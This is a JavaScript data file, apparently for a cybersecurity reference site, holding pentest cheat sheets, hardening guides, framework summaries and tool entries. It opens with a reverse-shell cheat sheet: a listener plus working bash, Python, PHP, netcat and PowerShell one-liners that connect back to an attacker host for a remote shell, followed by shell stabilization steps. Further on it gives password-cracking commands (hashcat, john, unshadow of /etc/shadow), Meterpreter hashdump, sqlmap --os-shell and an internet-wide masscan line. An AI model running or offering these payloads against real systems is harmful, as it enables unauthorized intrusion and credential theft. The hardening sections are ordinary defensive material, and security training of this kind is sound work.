Start this **before** executing the payload!
\`\`\`bash
nc -lvnp 4444
# -l: Listen
# -v: Verbose
# -n: No DNS lookup
# -p: Port
\`\`\`

## 🐚 Common Payloads

### Bash (Universal)
\`\`\`bash
bash -i >& /dev/tcp/10.10.10.1/4444 0>&1
\`\`\`

### Python (Stable)
\`\`\`python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
\`\`\`

### PHP (Web Servers)
\`\`\`php
php -r '$sock=fsockopen("10.10.10.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
\`\`\`

### Netcat (Traditional)
\`\`\`bash
nc -e /bin/sh 10.10.10.1 4444
# If -e is missing (OpenBSD netcat):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f
\`\`\`

### PowerShell (Windows)
\`\`\`powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
\`\`\`

## 💡 Stabilization
Upgrade your shell to a full TTY (interactive).
\`\`\`bash
# 1. In reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z

# 2. In local shell:
stty raw -echo; fg

# 3. In reverse shell:
export TERM=xterm
\`\`\``,
        tools: ['Netcat', 'Socat', 'MSFVenom']
    },
    'owasp-top10': {
        name: 'OWASP Top 10 (2021)',
        category: 'Cheatsheet',
        description: 'Critical web application security risks and mitigation strategies.',
        content: `# OWASP Top 10 Cheatsheet

## 🛑 A01: Broken Access Control
*Users can act outside of their intended permissions.*
- **Attack Vectors:** IDOR, Privilege Escalation, CORS misconfiguration.
- **Prevention:** Deny by default, implement role-based access control (RBAC).

## 🔐 A02: Cryptographic Failures
*Failures related to cryptography (formerly Sensitive Data Exposure).*
- **Attack Vectors:** Cleartext transmission, weak algorithms (MD5, SHA1), hardcoded keys.
- **Prevention:** Encrypt data at rest/transit, use TLS 1.2/1.3, strong key management.

## 💉 A03: Injection
*Untrusted data is sent to an interpreter as part of a command or query.*
- **Attack Vectors:** SQLi, NoSQLi, OS Command Injection, XSS.
- **Prevention:** Use prepared statements (parameterized queries), input validation, escaping.

## 🏗️ A04: Insecure Design
*Risks related to design flaws and architectural structures.*
- **Attack Vectors:** Missing security controls, unchecked assumptions.
- **Prevention:** Threat modeling, secure design patterns, "Shift Left".

## ⚙️ A05: Security Misconfiguration
*Missing appropriate security hardening.*
- **Attack Vectors:** Default accounts, open cloud storage, verbose error messages.
- **Prevention:** Hardening guides, automated configuration audits, remove unused features.

## 📦 A06: Vulnerable Components
*Using libraries or frameworks with known vulnerabilities.*
- **Attack Vectors:** Outdated dependencies (Log4j, Struts).
- **Prevention:** Software Composition Analysis (SCA), patch management, SBOM.

## 🔑 A07: Identification & Auth Failures
*Failures in authentication and session management.*
- **Attack Vectors:** Brute force, credential stuffing, weak session IDs.
- **Prevention:** MFA, strong password policies, rate limiting.

## 🛡️ A08: Software & Data Integrity
*Code and infrastructure that does not protect against integrity violations.*
- **Attack Vectors:** Insecure CI/CD pipelines, untrusted updates.
- **Prevention:** Code signing, verify digital signatures, secure supply chain.

## 📝 A09: Logging & Monitoring Failures
*Insufficient logging allows attacks to go unnoticed.*
- **Attack Vectors:** Breaches not detected for months.
- **Prevention:** Centralized logging, SIEM, real-time alerts.

## 🌐 A10: Server-Side Request Forgery (SSRF)
*Web application fetches a remote resource without validating the user-supplied URL.*
- **Attack Vectors:** Accessing internal services (metadata API), port scanning.
- **Prevention:** Input validation, network segmentation, disable HTTP redirections.`,
        tools: ['Burp Suite', 'OWASP ZAP', 'Nikto']
    },
    'password-cracking': {
        name: 'Password Cracking',
        category: 'Cheatsheet',
        description: 'Hashcat and John the Ripper commands for password cracking.',
        content: `# Password Cracking Cheatsheet

## 🔢 Common Hash Modes (Hashcat)
| Mode | Hash Type | Example |
|------|-----------|---------|
| 0    | MD5       | 8743b52063cd84097a65d1633f5c74f5 |
| 1000 | NTLM      | b4b9b02e6f09a9bd760f388b67351e2b |
| 1800 | sha512crypt | $6$saltsalt$qFm... |
| 3200 | bcrypt    | $2a$05$LhayLxezLhK1LhWvKxCyLOj0j1u.Kj0jZ0p8wCPJmqZ0p8wCPJmq |

## 🔨 Hashcat Attack Modes
- **-a 0**: Straight (Wordlist)
- **-a 1**: Combination (word + word)
- **-a 3**: Brute-force / Mask
- **-a 6**: Hybrid Wordlist + Mask
- **-a 7**: Hybrid Mask + Wordlist

## 🚀 Hashcat Commands
\`\`\`bash
# MD5 (Wordlist)
hashcat -m 0 -a 0 hash.txt rockyou.txt

# NTLM (Wordlist + Rules)
hashcat -m 1000 -a 0 hash.txt rockyou.txt -r rules/best64.rule

# WPA/WPA2 (Handshake)
hashcat -m 2500 -a 0 capture.hccapx rockyou.txt

# Mask Attack (8 char lowercase + numbers)
hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?d?d?d
# ?l = a-z, ?u = A-Z, ?d = 0-9, ?s = special
\`\`\`

## 🕵️ John the Ripper
Great for auto-detecting formats and CPU cracking.
\`\`\`bash
# Auto-detect and crack
john --wordlist=rockyou.txt hash.txt

# Show cracked passwords
john --show hash.txt

# Incremental mode (Brute-force)
john --incremental hash.txt

# Unshadow (Linux)
unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=rockyou.txt hashes.txt
\`\`\``,
        tools: ['Hashcat', 'John the Ripper', 'Hydra']
    },
    'metasploit-essentials': {
        name: 'Metasploit Essentials',
        category: 'Cheatsheet',
        description: 'MSF commands, module usage, and payload generation.',
        content: `# Metasploit Cheatsheet

## Meterpreter Commands
sysinfo                       # System information
getuid                        # Current user
ps                            # Running processes
migrate <PID>                 # Migrate to process
hashdump                      # Dump password hashes
screenshot                    # Capture screenshot`,
        tools: ['Metasploit', 'msfvenom', 'Meterpreter']
    },
    'ssh-hardening-guide': {
        name: 'SSH Hardening',
        category: 'Guide',
        description: 'Best practices for securing SSH access with configuration examples.',
        content: `# SSH Hardening Guide

## /etc/ssh/sshd_config
# Disable root login
PermitRootLogin no

# Disable password authentication
PasswordAuthentication no
ChallengeResponseAuthentication no

# Use key-based auth only
PubkeyAuthentication yes

# Change default port
Port 2222

# Limit max auth attempts
MaxAuthTries 3

# Set idle timeout
ClientAliveInterval 300
ClientAliveCountMax 2

# Disable empty passwords
PermitEmptyPasswords no

# Protocol 2 only
Protocol 2

## Key Generation
ssh-keygen -t ed25519 -C "user@host"
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@host

## Fail2ban Configuration
[sshd]
enabled = true
port = 2222
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
ban time = 3600
findtime = 600

## UFW Firewall Rules
ufw allow 2222/tcp
ufw enable

## Two-Factor Authentication
# Install Google Authenticator
apt-get install libpam-google-authenticator
google-authenticator

# Enable in PAM
echo "auth required pam_google_authenticator.so" >> /etc/pam.d/sshd`,
        tools: ['OpenSSH', 'Fail2ban', 'UFW', 'Google Authenticator']
    },
    'ufw-firewall': {
        name: 'UFW Firewall Setup',
        category: 'Guide',
        description: 'Configuring Uncomplicated Firewall for basic server protection.',
        content: `# UFW Firewall Guide

## Basic Commands
ufw status                    # Check status
ufw enable                    # Enable firewall
ufw disable                   # Disable firewall
ufw reset                     # Reset all rules

## Allow Rules
ufw allow 22/tcp              # SSH
ufw allow 80/tcp              # HTTP
ufw allow 443/tcp             # HTTPS
ufw allow from 192.168.1.0/24 # Subnet

## Deny Rules
ufw deny 23/tcp               # Deny telnet
ufw deny from 10.0.0.5        # Block IP

## Delete Rules
ufw delete allow 80/tcp
ufw status numbered
ufw delete 2                  # Delete by number

## Rate Limiting (Anti-bruteforce)
ufw limit 22/tcp

## Application Profiles
ufw app list
ufw allow 'Nginx Full'
ufw allow 'OpenSSH'

## Default Policies
ufw default deny incoming
ufw default allow outgoing

## Logging
ufw logging on
ufw logging medium

## Advanced Rules
# Allow specific port range
ufw allow 6000:6007/tcp

# Allow from specific interface
ufw allow in on eth0 to any port 22`,
        tools: ['UFW', 'iptables']
    },
    'tls-ssl-config': {
        name: 'TLS/SSL Configuration',
        category: 'Guide',
        description: 'Securing web servers with proper certificate and cipher configuration.',
        content: `# TLS/SSL Configuration Guide

## Nginx Configuration
ssl_protocols TLSv1.2 TLSv1.3;
ssl_prefer_server_ciphers on;
ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
ssl_session_timeout 1d;
ssl_session_cache shared:SSL:50m;
ssl_stapling on;
ssl_stapling_verify on;

# Certificate paths
ssl_certificate /etc/letsencrypt/live/domain.com/fullchain.pem;
ssl_certificate_key /etc/letsencrypt/live/domain.com/privkey.pem;

# HSTS Header
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

## Apache Configuration
SSLEngine on
SSLProtocol all -SSLv2 -SSLv3 -TLSv1 -TLSv1.1
SSLCipherSuite HIGH:!aNULL:!MD5
SSLHonorCipherOrder on

SSLCertificateFile /etc/ssl/certs/domain. crt
SSLCertificateKeyFile /etc/ssl/private/domain.key

## Let's Encrypt
# Install Certbot
apt-get install certbot python3-certbot-nginx

# Obtain certificate
certbot --nginx -d domain.com -d www.domain.com

# Auto-renewal
certbot renew --dry-run

## Testing
# Test SSL configuration
openssl s_client -connect domain.com:443

# SSL Labs test
https://www.ssllabs.com/ssltest/`,
        tools: ['Certbot', 'OpenSSL', 'SSL Labs']
    },
    'active-directory': {
        name: 'Active Directory Security',
        category: 'Guide',
        description: 'Hardening Windows AD environment and common attack mitigations.',
        content: `# Active Directory Security Guide

## User Account Security
# Enforce strong passwords
Set-ADDefaultDomainPasswordPolicy -MinPasswordLength 14 -ComplexityEnabled $true

# Enable account lockout
Set-ADDefaultDomainPasswordPolicy -LockoutThreshold 5 -LockoutDuration 00:30:00

# Disable SMBv1
Set-SmbServerConfiguration -EnableSMB1Protocol $false

## Admin Accounts
# Separate admin accounts
# Use PAW (Privileged Access Workstations)
# Implement JIT (Just-In-Time) admin access

## Group Policy
# Disable LLMNR
Computer Configuration > Administrative Templates > Network > DNS Client > Turn off multicast name resolution

# Disable WPAD
User Configuration > Preferences > Windows Settings > Registry

## Attack Mitigation
# Kerberoasting prevention
- Use long, complex service account passwords
- Implement Group Managed Service Accounts (gMSA)

# Golden Ticket prevention
- Reset KRBTGT password twice
- Monitor Event ID 4768, 4769

# Pass-the-Hash prevention
- Disable NTLM authentication
- Use Credential Guard

## Monitoring
# Enable advanced auditing
auditpol /set /subcategory:"Logon" /success:enable /failure:enable

# Monitor for attacks
- BloodHound for attack path analysis
- Check for DCSync attempts (Event 4662)
- Monitor for unusual Kerberos activity`,
        tools: ['BloodHound', 'Mimikatz (defense)', 'PowerView']
    }
};

const CYBER_FRAMEWORKS_DATA = {
    'mitre-attack': {
        name: 'MITRE ATT&CK',
        description: 'Globally-accessible knowledge base of adversary tactics and techniques based on real-world observations.',
        overview: 'The MITRE ATT&CK framework is a comprehensive matrix of tactics and techniques used by threat hunters, red teamers, and defenders to better classify attacks and assess organizational security posture.',
        tactics: [
            'Reconnaissance', 'Resource Development', 'Initial Access', 'Execution',
            'Persistence', 'Privilege Escalation', 'Defense Evasion', 'Credential Access',
            'Discovery', 'Lateral Movement', 'Collection', 'Command and Control',
            'Exfiltration', 'Impact'
        ],
        useCase: 'Use MITRE ATT&CK to map defensive capabilities, identify gaps in security, develop detection analytics, and assess threat intelligence.',
        resources: [
            { name: 'MITRE ATT&CK', url: 'https://attack.mitre.org/' },
            { name: 'ATT&CK Navigator', url: 'https://mitre-attack.github.io/attack-navigator/' }
        ]
    },
    'kill-chain': {
        name: 'Cyber Kill Chain',
        description: 'Military-inspired model for understanding the stages of a cyber attack developed by Lockheed Martin.',
        overview: 'The Cyber Kill Chain breaks down cyber attacks into seven stages, allowing defenders to understand and interrupt attacks at each phase.',
        phases: [
            '1. Reconnaissance - Research, identification, and selection of targets',
            '2. Weaponization - Creating malicious payload',
            '3. Delivery - Transmitting the weapon to the target',
            '4. Exploitation - Triggering the adversary\'s code',
            '5. Installation - Installing a backdoor on the victim system',
            '6. Command & Control - Establishing C2 channel',
            '7. Actions on Objectives - Achieving the intended goal'
        ],
        useCase: 'Use the Kill Chain to develop layered defenses at each stage and create detection mechanisms for early attack identification.',
        resources: [
            { name: 'Lockheed Martin Paper', url: 'https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html' }
        ]
    },
    'nist-framework': {
        name: 'NIST Cybersecurity Framework',
        description: 'Risk-based approach to managing cybersecurity risk developed by the National Institute of Standards and Technology.',
        overview: 'The NIST Framework provides a policy framework of computer security guidance for how private sector organizations can assess and improve their ability to prevent, detect, and respond to cyber attacks.',
        functions: [
            'IDENTIFY - Develop understanding of managing cybersecurity risk to systems, assets, data, and capabilities',
            'PROTECT - Implement safeguards to ensure delivery of critical services',
            'DETECT - Develop and implement activities to identify cybersecurity events',
            'RESPOND - Take action regarding a detected cybersecurity incident',
            'RECOVER - Maintain plans for resilience and restore capabilities or services'
        ],
        useCase: 'Use NIST Framework for compliance, risk management, and to establish a common language for cybersecurity across the organization.',
        resources: [
            { name: 'NIST CSF', url: 'https://www.nist.gov/cyberframework' },
            { name: 'Implementation Guide', url: 'https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf' }
        ]
    },
    'cis-controls': {
        name: 'CIS Controls',
        description: '20 prioritized cybersecurity best practices developed by the Center for Internet Security.',
        overview: 'CIS Controls are a prescriptive, prioritized, and simplified set of best practices that you can use to strengthen your cybersecurity posture.',
        controls: [
            'CIS 1: Inventory and Control of Enterprise Assets',
            'CIS 2: Inventory and Control of Software Assets',
            'CIS 3: Data Protection',
            'CIS 4: Secure Configuration of Enterprise Assets',
            'CIS 5: Account Management',
            'CIS 6: Access Control Management',
            'CIS 7: Continuous Vulnerability Management',
            'CIS 8: Audit Log Management',
            'And 12 more controls...'
        ],
        useCase: 'Implement CIS Controls to establish fundamental security hygiene and prioritize defensive actions based on real-world attack patterns.',
        resources: [
            { name: 'CIS Controls', url: 'https://www.cisecurity.org/controls' },
            { name: 'Implementation Groups', url: 'https://www.cisecurity.org/controls/cis-controls-implementation-groups' }
        ]
    }
};

const CYBER_TOOLS_DATA = {
    'nmap': {
        name: 'Nmap',
        category: 'Reconnaissance',
        description: 'Network Mapper - free and open source utility for network discovery and security auditing.',
        useCases: ['Port scanning', 'Service detection', 'OS fingerprinting', 'Script scanning'],
        commands: [
            'nmap -sV -sC target.com    # Version + scripts',
            'nmap -p- target.com         # All ports',
            'nmap -A target.com          # Aggressive scan'
        ]
    },
    'masscan': {
        name: 'Masscan',
        category: 'Reconnaissance',
        description: 'Fastest Internet port scanner, capable of scanning the entire Internet in under 6 minutes.',
        useCases: ['Fast port scanning', 'Large network scanning', 'Internet-wide scans'],
        commands: [
            'masscan -p1-65535 10.0.0.0/8 --rate=10000',
            'masscan -p80,443 0.0.0.0/0 --rate=100000'
        ]
    },
    'burp-suite': {
        name: 'Burp Suite',
        category: 'Web Testing',
        description: 'Integrated platform for performing security testing of web applications.',
        useCases: ['Intercepting proxy', 'Scanner', 'Intruder', 'Repeater', 'Sequencer'],
        commands: ['Proxy: http://localhost:8080', 'Install CA certificate for HTTPS interception']
    },
    'sqlmap': {
        name: 'SQLmap',
        category: 'Web Testing',
        description: 'Automatic SQL injection and database takeover tool.',
        useCases: ['SQL injection detection', 'Database enumeration', 'Data exfiltration'],
        commands: [
            'sqlmap -u "http://target.com/page?id=1" --dbs',
            'sqlmap -u "http://target.com/page?id=1" -D database --tables',
            'sqlmap -u "http://target.com/page?id=1" --os-shell'
        ]
    },
    'metasploit': {
        name: 'Metasploit',
        category: 'Exploitation',
        description: 'Penetration testing framework with thousands of exploits and payloads.',
        useCases: ['Exploitation', 'Post-exploitation', 'Payload generation', 'Auxiliary modules'],
        commands: [
            'msfconsole',
            'search eternalblue',
            'use exploit/multi/handler'
        ]
    },
    'searchsploit': {
        name: 'Searchsploit',
        category: 'Exploitation',
        description: 'Command line search tool for Exploit-DB.',
        useCases: ['Exploit search', 'Offline exploit database', 'Vulnerability research'],
        commands: [
            'searchsploit apache',
            'searchsploit -m 12345',
            'searchsploit --nmap nmap-output.xml'
        ]
    }
};
